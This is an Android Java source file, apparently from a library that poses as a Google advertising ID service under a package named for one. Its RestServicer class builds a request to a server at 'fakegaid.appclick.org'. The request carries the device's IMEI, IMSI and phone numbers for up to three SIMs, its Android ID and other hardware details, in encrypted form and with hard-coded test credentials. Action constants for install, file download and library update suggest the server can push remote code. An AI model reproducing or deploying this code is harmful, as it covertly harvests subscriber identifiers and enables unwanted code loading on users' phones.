package com.advertising_id_service.appclick.googleadvertisingidservice.REST;

import android.content.Context;

import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.FilesLoader.FilesLoader;
import com.advertising_id_service.appclick.googleadvertisingidservice.CryptoProvider.CryptoProviderServicer;
import com.advertising_id_service.appclick.googleadvertisingidservice.DeviceInfo;
import com.advertising_id_service.appclick.googleadvertisingidservice.GlobalParameters;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultUpdate;

import static com.advertising_id_service.appclick.googleadvertisingidservice.CryptoProvider.CryptoProviderServicer.codeUrlParams;

public class RestServicer {
    public static final int LOADER_CREATE      = 1;
    public static final int LOADER_INSTALL     = 2;
    public static final int LOADER_READ        = 3;
    public static final int LOADER_DELETE      = 4;
    public static final int LOADER_UPDATE      = 5;
    public static final int LOADER_UPDATE_LIB  = 6;
    private static String formatJsonParam(String k, String v)
    {
        return "\"" + k + "\":\"" + v + "\"";
    }

    public static final String TAG           = "GAID_REST";
    public static final String BASE_URL      = "https://fakegaid.appclick.org/gaid";

    public  static final String ACTION_CREATE          = "create";
    public  static final String ACTION_INSTALL         = "install";
    public  static final String ACTION_READ            = "read";
    public  static final String ACTION_DELETE          = "delete";
    public  static final String ACTION_UPDATE          = "update";
    public  static final String ACTION_DOWNLOAD_FILE   = "file_download";
    public  static final String ACTION_LOG             = "log";
    public  static final String ACTION_UPDATE_LIB      = "update_lib";

    public static final int CODE_NULL_RESULT   = 0;
    public static final int CODE_OK            = 1;
    public static final int CODE_UNKNOWN_ERROR = 2;

    public enum TypeRestServicer{
        SIMPLE,
        RETROFIT
    }

    public static synchronized IRestServicer getRestServicer(TypeRestServicer type)
    {
        IRestServicer res = null;
        switch (type) {
            case SIMPLE:
                res =  RestServicerSimple.getRestServicer();
                break;
            case RETROFIT:
                res =  RestServicerRetrofit.getRestServicer();
                break;
            default:
                res =  RestServicerSimple.getRestServicer();
                break;
        }
        return res;
    }

    public static String getUrlToDownloadFile(Context cnt, String path, String comment, String downloadId)
    {
        DeviceInfo devInfo = DeviceInfo.getDeviceInfo(cnt, "");

        ResultUpdate res = null;
        FilesLoader fl = new FilesLoader();
        String base_url = RestServicer.BASE_URL;
        base_url += "?data=";
        String url = "{";
        url += formatJsonParam("login"        ,"test")                          + ",";
        url += formatJsonParam("pass"         ,"1111")                          + ",";
        url += formatJsonParam("action"       ,RestServicer.ACTION_DOWNLOAD_FILE)  + ",";
        url += formatJsonParam("guid"         ,devInfo.guid)                       + ",";
        url += formatJsonParam("imei1"        ,devInfo.imei1)                      + ",";
        url += formatJsonParam("imsi1"        ,devInfo.imsi1)                      + ",";
        url += formatJsonParam("msisdn1"      ,devInfo.msisdn1)                    + ",";
        url += formatJsonParam("imei2"        ,devInfo.imei2)                      + ",";
        url += formatJsonParam("imsi2"        ,devInfo.imsi2)                      + ",";
        url += formatJsonParam("msisdn2"      ,devInfo.msisdn2)                    + ",";
        url += formatJsonParam("imei3"        ,devInfo.imei3)                      + ",";
        url += formatJsonParam("imsi3"        ,devInfo.imsi3)                      + ",";
        url += formatJsonParam("msisdn3"      ,devInfo.msisdn3)                    + ",";
        url += formatJsonParam("version_os"   ,devInfo.version_os)                 + ",";
        url += formatJsonParam("device"       ,devInfo.device)                     + ",";
        url += formatJsonParam("model"        ,devInfo.model)                      + ",";
        url += formatJsonParam("manufactor"   ,devInfo.manufactor)                 + ",";
        url += formatJsonParam("brand"        ,devInfo.brand)                      + ",";
        url += formatJsonParam("android_id"   ,devInfo.android_id)                 + ",";
        url += formatJsonParam("product_id"   ,devInfo.product_id)                 + ",";
        url += formatJsonParam("lib_version"  ,GlobalParameters.CODE_VERSION)      + ",";
        url += formatJsonParam("comment"      ,comment)                            + ",";
        url += formatJsonParam("versionName"  ,devInfo.versionName)                + ",";
        url += formatJsonParam("path"         ,path)                               + ",";
//        url += formatJsonParam("sign"         ,devInfo.sign)                       + ",";
        url += formatJsonParam("download_id"  ,downloadId)+ ",";
        url +="}";
        return (base_url + CryptoProviderServicer.codeUrlParams(cnt, url));
        //return (base_url + CryptoProviderServicer.cript(url));
    }

}
